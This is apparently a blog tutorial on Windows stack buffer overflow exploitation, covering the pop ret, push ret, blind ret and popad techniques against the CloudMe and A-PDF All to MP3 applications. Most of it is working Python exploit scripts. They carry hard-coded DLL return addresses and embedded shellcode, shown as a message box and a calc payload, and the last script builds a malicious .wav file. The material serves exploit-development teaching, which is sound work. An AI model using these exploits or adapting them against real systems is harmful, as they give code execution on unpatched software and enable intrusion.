<h2 id="windows-exploit-development-part-ii">Windows Exploit Development Part II</h2>

<p>Hello everyone. Today, I’ll show you the different skills you need to create exploits. In this section, I’ll talk more about the Immunity Debugger.We will use methods like:</p>

<ul>
  <li><strong>Pop Return</strong> this technique is not related to the SEH technique.</li>
  <li><strong>Push Return</strong>.</li>
  <li><strong>Blind Return</strong>.</li>
  <li><strong>Popad</strong> is also used in Unicode technique.</li>
</ul>

<h2 id="pop-return-technique">Pop Return Technique</h2>

<p>If any registry doesn’t use the shellcode directly, it will be seen in the stack and won’t run our code because of different things that happen during the attack.We will use this method, which is a bounce pop pop ret and either jmp esp or call esp from a DLL.</p>

<p>The pop ret method can only be used if ESP+offset already has an address that points to the shellcode.All we have to do is check to see if the first addresses point to the shellcode and add a reference to pop pop ret in EIP.Every time you pop, this will take an address from the stack and put the next address into EIP.</p>

<p>I’ll get right to making the script for our attack. I’ll use the same program as in the first part CloudME.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">socket</span>

<span class="n">target</span><span class="o">=</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span>
<span class="n">junk</span><span class="o">=</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">1052</span>
<span class="n">pop</span><span class="o">=</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">4</span>
<span class="n">junk1</span><span class="o">=</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span>
<span class="n">junk1</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">7</span>
<span class="n">jmp_esp</span><span class="o">=</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span><span class="o">*</span><span class="mi">4</span>
<span class="n">shellcode</span> <span class="o">=</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">1000</span>
<span class="n">payload</span><span class="o">=</span><span class="n">junk</span><span class="o">+</span><span class="n">pop</span><span class="o">+</span><span class="n">junk1</span><span class="o">+</span><span class="n">jmp_esp</span><span class="o">+</span><span class="n">shellcode</span>

<span class="k">try</span><span class="p">:</span>
	<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
	<span class="k">print</span> <span class="sh">"</span><span class="s">Don</span><span class="sh">'</span><span class="s">t Crash Me !</span><span class="sh">"</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>We know that we need 1052 bytes before we can overwrite EIP and that we need 4 more bytes to get to the address on the stack that ESP points to (in my case, ESP is <code class="language-plaintext highlighter-rouge">0x0022ab50</code>, which is colored green).We will pretend that we have a pointer to the shellcode at ESP+8.</p>

<p>We have 1052 A and 4 B. We use one C as a break, which gives us 7 NOPS. We also have 4 C and a fake shellcode that gives us 1000 NOPS. The goal is to jump over the first break, which is colored blue (C), and go straight to the second break, which is colored orange and light green (CCCC).We need to use ESP+8 = 0x0022ab58 purple color to do this.</p>

<p>Let’s use WinDGB to figure out what we try to do, connect the process, and run your script.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win3.png" alt="windows" /></p>

<p>We see the EIP is overwite with BBBB but we need to overwrite with ESP + 8….. I will make a table to see how look this technique.</p>

<table>
  <thead>
    <tr>
      <th>BUFFER</th>
      <th>EIP</th>
      <th>Space 8 bytes (Nop)</th>
      <th>JMP ESP</th>
      <th>Shellcode</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>A * 1052</td>
      <td>POP POP RET</td>
      <td>90 90 90 90 90 90 90 90</td>
      <td>0xaddress</td>
      <td>\xba\xd5\x31\x08\x38…</td>
    </tr>
  </tbody>
</table>

<p>Example of POC code:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">socket</span>

<span class="n">target</span><span class="o">=</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span>
<span class="n">junk</span><span class="o">=</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">1052</span>
<span class="n">pop</span><span class="o">=</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">4</span> 	                <span class="c1"># Address pop pop ret
</span><span class="n">junk1</span><span class="o">=</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> 			<span class="c1"># 8 bites space
</span><span class="n">jmp_esp</span><span class="o">=</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span><span class="o">*</span><span class="mi">4</span> 			<span class="c1"># jmp esp address
</span><span class="n">nop</span><span class="o">=</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">20</span> 			<span class="c1"># NOPS
</span><span class="n">shellcode</span> <span class="o">=</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">1000</span> 		<span class="c1"># Shellcode
</span><span class="n">payload</span><span class="o">=</span><span class="n">junk</span><span class="o">+</span><span class="n">pop</span><span class="o">+</span><span class="n">junk1</span><span class="o">+</span><span class="n">jmp_esp</span><span class="o">+</span><span class="n">nop</span><span class="o">+</span><span class="n">shellcode</span>

<span class="k">try</span><span class="p">:</span>

	<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
	<span class="k">print</span> <span class="sh">"</span><span class="s">Don</span><span class="sh">'</span><span class="s">t Crash Me !</span><span class="sh">"</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now we use Immunity Debbuger for search in dll from <code class="language-plaintext highlighter-rouge">pop pop ret</code> and <code class="language-plaintext highlighter-rouge">jmp esp</code> or <code class="language-plaintext highlighter-rouge">call esp</code>. Run as Administrator Immunity and attache the process(PID)! Use <code class="language-plaintext highlighter-rouge">mona.py</code> to found dll’s without protection:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="o">!</span>mona nosafeseh
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win5.png" alt="windows" /></p>

<p>Everything that is “False” can be used for found address! <code class="language-plaintext highlighter-rouge">Use ALT + E</code> to found all dll’s. I use third dll. But dont miss to start the program.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>61B40000|005F6000|Qt5Gui|5.9.0.0|C:<span class="se">\U</span>sers<span class="se">\B</span>uffer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>rograms<span class="se">\C</span>loudMe<span class="se">\C</span>loudMe<span class="se">\Q</span>t5Gui.dll
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now we use <code class="language-plaintext highlighter-rouge">ALT + S</code> to find sequence of commands for <code class="language-plaintext highlighter-rouge">pop pop ret</code> , I use <code class="language-plaintext highlighter-rouge">pop r32</code> because i have x86 arhitecture.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win6.png" alt="windows" /></p>

<p>Now we use same dll for found <code class="language-plaintext highlighter-rouge">jmp esp</code> address. Use <code class="language-plaintext highlighter-rouge">CTRL + F</code> to find command.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win7.png" alt="windows" /></p>

<p>#e have all pices for exploit. We have <code class="language-plaintext highlighter-rouge">pop pop ret</code> address <code class="language-plaintext highlighter-rouge">0x77621f29</code> and <code class="language-plaintext highlighter-rouge">ESP+8</code> address <code class="language-plaintext highlighter-rouge">0x7767e684</code> (1052 A + pop_ret+8_bites_space+jmp_esp+nop+shellcode).</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">socket</span>


<span class="n">target</span><span class="o">=</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span>
<span class="n">junk</span><span class="o">=</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">1052</span>
<span class="n">pop</span><span class="o">=</span><span class="sh">"</span><span class="se">\x29\x1f\x62\x77</span><span class="sh">"</span>  		<span class="c1"># 0x77621F29   5B     POP EBX
</span><span class="n">junk1</span><span class="o">=</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> 				<span class="c1"># 8 bites space
</span><span class="n">jmp_esp</span><span class="o">=</span><span class="sh">"</span><span class="se">\x84\xe6\x67\x77</span><span class="sh">"</span> 		<span class="c1"># 0x7767E684   FFE4   JMP ESP
</span><span class="n">nop</span><span class="o">=</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">20</span> 				<span class="c1"># NOPS
</span>
<span class="c1">#Shellcode message BrokenByte
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="se">\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x49\x0b\x31\xc0\x51\x50\xff\xd7</span><span class="sh">"</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">junk</span><span class="o">+</span><span class="n">pop</span><span class="o">+</span><span class="n">junk1</span><span class="o">+</span><span class="n">jmp_esp</span><span class="o">+</span><span class="n">nop</span><span class="o">+</span><span class="n">shellcode</span>

<span class="k">try</span><span class="p">:</span>
	<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
	<span class="k">print</span> <span class="sh">"</span><span class="s">Don</span><span class="sh">'</span><span class="s">t Crash Me !</span><span class="sh">"</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Run exploit.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win8.png" alt="windows" /></p>

<h2 id="push-return-technique">Push Return Technique</h2>

<p>This technique is a little bit different than a jump or call. That’s why I will not get into details. All we have to do is overwrite EIP with address of push on the one dll’s.</p>

<p>Open WinDGB attache the process CloudME.exe ,don’t use <code class="language-plaintext highlighter-rouge">g</code> for start the software.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win9.png" alt="windows" /></p>

<p>Now we need to found in dll in area <code class="language-plaintext highlighter-rouge">push esp</code> and opcode is <code class="language-plaintext highlighter-rouge">54 c3</code>. I use this dll.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>ModLoad: 68a80000 69055000   C:<span class="se">\U</span>sers<span class="se">\B</span>uffer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>rograms<span class="se">\C</span>loudMe<span class="se">\C</span>loudMe<span class="se">\Q</span>t5Core.dll
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win10.png" alt="windows" /></p>

<p>I use first address <code class="language-plaintext highlighter-rouge">0x68a842b5</code>. Now let’s make a exploit with this address.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">socket</span>

<span class="n">target</span><span class="o">=</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span>
<span class="n">junk</span><span class="o">=</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">1052</span>
<span class="n">push</span><span class="o">=</span><span class="sh">"</span><span class="se">\xb5\x42\xa8\x68</span><span class="sh">"</span>     <span class="c1"># push ESP RET 0x68a842b5
</span><span class="n">nop</span><span class="o">=</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">20</span> 		    <span class="c1"># NOPS
</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="se">\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x49\x0b\x31\xc0\x51\x50\xff\xd7</span><span class="sh">"</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">junk</span><span class="o">+</span><span class="n">push</span><span class="o">+</span><span class="n">nop</span><span class="o">+</span><span class="n">shellcode</span>
<span class="k">try</span><span class="p">:</span>
	<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
	<span class="k">print</span> <span class="sh">"</span><span class="s">Don</span><span class="sh">'</span><span class="s">t Crash Me !</span><span class="sh">"</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Run exploit.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win11.png" alt="windows" /></p>

<h2 id="blind-ret-technique">Blind Ret Technique</h2>

<p>This technique varies from software to software. It is used to overwrite the address EIP with <code class="language-plaintext highlighter-rouge">ret</code> address,then use another address <code class="language-plaintext highlighter-rouge">jmp esp</code> for bounce at shellcode.</p>

<p>Use WinDGB to found address of <code class="language-plaintext highlighter-rouge">ret</code> instruction like in image.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win12.png" alt="windows" /></p>

<p>We have address for <code class="language-plaintext highlighter-rouge">ret=0x6eb41011</code>. To found <code class="language-plaintext highlighter-rouge">jmp esp</code>, I use another dll.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win13.png" alt="windows" /></p>

<p>We got the bot address <code class="language-plaintext highlighter-rouge">ret=0x6eb41011</code> and  <code class="language-plaintext highlighter-rouge">jmp esp=0x61ffba23</code>. Final POC look like this:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="n">mport</span> <span class="n">socket</span>

<span class="n">target</span><span class="o">=</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span>
<span class="n">junk</span><span class="o">=</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">1052</span>
<span class="n">ret</span><span class="o">=</span><span class="sh">"</span><span class="se">\x11\x10\xb4\x6e</span><span class="sh">"</span>       <span class="c1"># 0x6eb41011 ret c3
</span><span class="n">jmp_esp</span><span class="o">=</span><span class="sh">"</span><span class="se">\x23\xba\xff\x61</span><span class="sh">"</span>   <span class="c1"># 0x61ffba23 jmp esp ff e4
</span><span class="n">nop</span><span class="o">=</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">20</span>                <span class="c1"># NOPS
</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="se">\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x49\x0b\x31\xc0\x51\x50\xff\xd7</span><span class="sh">"</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">junk</span><span class="o">+</span><span class="n">ret</span><span class="o">+</span><span class="n">jmp_esp</span><span class="o">+</span><span class="n">nop</span><span class="o">+</span><span class="n">shellcode</span>

<span class="k">try</span><span class="p">:</span>

	<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
	<span class="k">print</span> <span class="sh">"</span><span class="s">Don</span><span class="sh">'</span><span class="s">t Crash Me !</span><span class="sh">"</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Again we have a pop up BrokenByte.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win14.png" alt="windows" /></p>

<h2 id="popad-technique">Popad Technique</h2>

<p>This technique is like pop pop ret ,but it’s more complex is also used at Unicode and Seh metode. We will make a small table to understand the structure of this method.</p>

<p>For this methode i will use another software called A-PDF ALL to MP3 <a href="https://www.exploit-db.com/apps/70e0d247368fd3f3232abc469c1fc952-a-pdf-atmc.exe">https://www.exploit-db.com/apps/70e0d247368fd3f3232abc469c1fc952-a-pdf-atmc.exe</a></p>

<table>
  <thead>
    <tr>
      <th>BUFFER</th>
      <th>NSEH</th>
      <th>POPAD_Address</th>
      <th>NOPS</th>
      <th>Shellcode</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>A * 4132</td>
      <td>0x909006eb —&gt; 6 bytes</td>
      <td>0xPOPAD_Address</td>
      <td>NOPNOPNOPNOP</td>
      <td>\xba\xd5\x31\x08\x38…</td>
    </tr>
  </tbody>
</table>

<p>Now let’s try to find the address of <code class="language-plaintext highlighter-rouge">popad</code> with WinDGB. First we’ll look for the opcode.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win15.png" alt="windows" /></p>

<p>I don’t know why normal <code class="language-plaintext highlighter-rouge">popad</code> won’t work, so I used a <code class="language-plaintext highlighter-rouge">popad</code> and <code class="language-plaintext highlighter-rouge">jmp ebp</code> instead. We have the opcode now. Let’s look for the address. I used dll first.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>ModLoad: 00400000 00610000   C:<span class="se">\P</span>rogram Files<span class="se">\A</span><span class="nt">-PDF</span> All to MP3<span class="se">\A</span>lltomp3.exe
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Nice, this place only has one address. Now we have all the pieces, and we have 4132 A because we use another software + 6_bites_jump + popad + jmp_ebp + nops + shellcode. The offset calculated buffer method does not change remains the same as the first software.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win16.png" alt="windows" /></p>

<p>Final POC.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre>
<span class="kn">import</span> <span class="n">socket</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">4132</span>
<span class="n">nseh</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\xeb\x06\x90\x90</span><span class="sh">"</span>  <span class="c1"># Jump 6 bytes
</span><span class="n">popad</span> <span class="o">=</span><span class="sh">"</span><span class="se">\x7f\x80\x55\x00</span><span class="sh">"</span>  <span class="c1"># 0055807f popad and jmp ebp opcode 61 ff e5
</span><span class="n">nops</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">80</span>         <span class="c1"># Nops
</span>
<span class="c1">#calc shellcode but be carefull this software contain a bad chars
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="se">\xdb\xd0\xd9\x74\x24\xf4\xbf\x77\x1c\x78\x77\x5d\x31\xc9\xb1</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x33\x31\x7d\x17\x03\x7d\x17\x83\x9a\xe0\x9a\x82\x98\xf1\xd2</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x6d\x60\x02\x85\xe4\x85\x33\x97\x93\xce\x66\x27\xd7\x82\x8a</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xcc\xb5\x36\x18\xa0\x11\x39\xa9\x0f\x44\x74\x2a\xbe\x48\xda</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xe8\xa0\x34\x20\x3d\x03\x04\xeb\x30\x42\x41\x11\xba\x16\x1a</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x5e\x69\x87\x2f\x22\xb2\xa6\xff\x29\x8a\xd0\x7a\xed\x7f\x6b</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x84\x3d\x2f\xe0\xce\xa5\x5b\xae\xee\xd4\x88\xac\xd3\x9f\xa5</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x07\xa7\x1e\x6c\x56\x48\x11\x50\x35\x77\x9e\x5d\x47\xbf\x18</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xbe\x32\xcb\x5b\x43\x45\x08\x26\x9f\xc0\x8d\x80\x54\x72\x76</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x31\xb8\xe5\xfd\x3d\x75\x61\x59\x21\x88\xa6\xd1\x5d\x01\x49</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x36\xd4\x51\x6e\x92\xbd\x02\x0f\x83\x1b\xe4\x30\xd3\xc3\x59</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x95\x9f\xe1\x8e\xaf\xfd\x6f\x50\x3d\x78\xd6\x52\x3d\x83\x78</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x3b\x0c\x08\x17\x3c\x91\xdb\x5c\xb2\xdb\x46\xf4\x5b\x82\x12</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x45\x06\x35\xc9\x89\x3f\xb6\xf8\x71\xc4\xa6\x88\x74\x80\x60</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x60\x04\x99\x04\x86\xbb\x9a\x0c\xe5\x5a\x09\xcc\xc4\xf9\xa9</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x77\x19</span><span class="sh">"</span><span class="p">)</span>

<span class="n">exploit</span><span class="o">=</span><span class="nb">buffer</span> <span class="o">+</span> <span class="n">nseh</span> <span class="o">+</span> <span class="n">popad</span> <span class="o">+</span> <span class="n">nops</span> <span class="o">+</span> <span class="n">shellcode</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">use</span><span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">POPAD.wav</span><span class="sh">"</span><span class="p">,</span><span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">use</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
    <span class="n">use</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="nf">raw_input</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">Exploit file created!</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>

<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span> <span class="sh">"</span><span class="s">Cannot create</span><span class="sh">"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>POPAD.wav file is create , open the software and put this file inside.</p>

<p><img src="/assets/img/headers/windows-exploit-dev-part-2/win17.png" alt="windows" /></p>

<p>I hope you like this article about Windows Exploit Development and sorry for my bad English, I am not a native speaker (Happy Hack).</p>

<h2 id="reference">Reference</h2>

<p><a href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/">https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/</a></p>

